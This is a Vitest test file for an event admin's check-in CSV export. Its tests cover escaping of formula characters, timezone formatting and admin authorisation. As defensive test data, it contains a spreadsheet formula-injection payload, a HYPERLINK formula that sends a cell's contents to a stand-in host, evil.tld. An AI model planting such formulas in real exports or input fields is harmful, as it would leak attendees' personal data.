import { beforeEach, describe, expect, it, vi } from "vitest";

const eventFindFirst = vi.fn();
const requireAdminMock = vi.fn();

vi.mock("@/lib/prisma", () => ({
  prisma: { event: { findFirst: (...a: unknown[]) => eventFindFirst(...a) } },
}));
vi.mock("@/lib/authz", () => ({
  requireAdmin: (...a: unknown[]) => requireAdminMock(...a),
}));

import { GET } from "@/app/(admin)/admin/eventos/[id]/checkins/route";

const EVENT_ID = "ckevent00000000000000001";
const ORG_ID = "ckorg000000000000000001";

function ticket(name: string) {
  return {
    id: "ckticket0000000000000001",
    checkedInAt: null,
    user: { name, email: "ana@example.com", phone: "11999999999", gender: "female" },
  };
}

async function csvFor(name: string): Promise<string> {
  eventFindFirst.mockResolvedValue({
    id: EVENT_ID,
    slug: "noite-teste",
    tickets: [ticket(name)],
  });
  const res = await GET(new Request("http://localhost/x"), {
    params: Promise.resolve({ id: EVENT_ID }),
  });
  return res.text();
}

beforeEach(() => {
  vi.clearAllMocks();
  requireAdminMock.mockResolvedValue({
    ok: true,
    user: { id: "ckadmin00000000000000001", role: "admin" },
    membership: { organizationId: ORG_ID, organization: { id: ORG_ID } },
  });
});

describe("check-in CSV export", () => {
  // Excel and Sheets evaluate a leading = + - @ as a formula even inside a
  // quoted field. `name` is attacker-controlled at signup, and the admin opens
  // this file at the door — so a formula here exfiltrates the attendee list.
  it.each([
    ["=HYPERLINK(evil)", "="],
    ["+1+1", "+"],
    ["-1+1", "-"],
    ["@SUM(A1)", "@"],
  ])("neutralizes a name starting with %s", async (name) => {
    const csv = await csvFor(name);
    // Cell opens with a quote then the apostrophe — the formula is now text.
    expect(csv).toContain(`"'${name}"`);
    // ...and the raw formula never begins a cell.
    expect(csv).not.toContain(`"${name}"`);
  });

  it("neutralizes a real exfiltration payload, quotes and all", async () => {
    const csv = await csvFor('=HYPERLINK("https://evil.tld/?d="&A1,"clique")');
    // The apostrophe defuses it; the inner quotes are still CSV-escaped.
    expect(csv).toContain(`"'=HYPERLINK(""https://evil.tld/?d=""&A1,""clique"")"`);
  });

  it("does not mangle an ordinary name", async () => {
    const csv = await csvFor("Ana Paula");
    expect(csv).toContain('"Ana Paula"');
    expect(csv).not.toContain("'Ana Paula");
  });

  it("still escapes embedded quotes", async () => {
    const csv = await csvFor('Ana "A" Paula');
    expect(csv).toContain('"Ana ""A"" Paula"');
  });

  it("writes the check-in time in São Paulo, not UTC", async () => {
    eventFindFirst.mockResolvedValue({
      id: EVENT_ID,
      slug: "noite-teste",
      tickets: [
        {
          id: "ckticket0000000000000001",
          checkedInAt: new Date("2026-07-17T23:30:00Z"), // 20:30 in São Paulo
          user: {
            name: "Ana",
            email: "ana@example.com",
            phone: "11999999999",
            gender: "female",
          },
        },
      ],
    });
    const res = await GET(new Request("http://localhost/x"), {
      params: Promise.resolve({ id: EVENT_ID }),
    });
    const csv = await res.text();
    // SP is UTC-3, so 23:30Z is 20:30 locally. The raw UTC ISO must not appear.
    expect(csv).toContain("20:30");
    expect(csv).not.toContain("2026-07-17T23:30:00.000Z");
  });

  it("refuses a non-admin", async () => {
    requireAdminMock.mockResolvedValue({ ok: false, error: "Acesso negado." });
    const res = await GET(new Request("http://localhost/x"), {
      params: Promise.resolve({ id: EVENT_ID }),
    });
    expect(res.status).toBe(403);
    expect(eventFindFirst).not.toHaveBeenCalled();
  });

  it("scopes the export to the admin's own organization", async () => {
    await csvFor("Ana");
    expect(eventFindFirst).toHaveBeenCalledWith(
      expect.objectContaining({
        where: { id: EVENT_ID, organizationId: ORG_ID },
      })
    );
  });
});
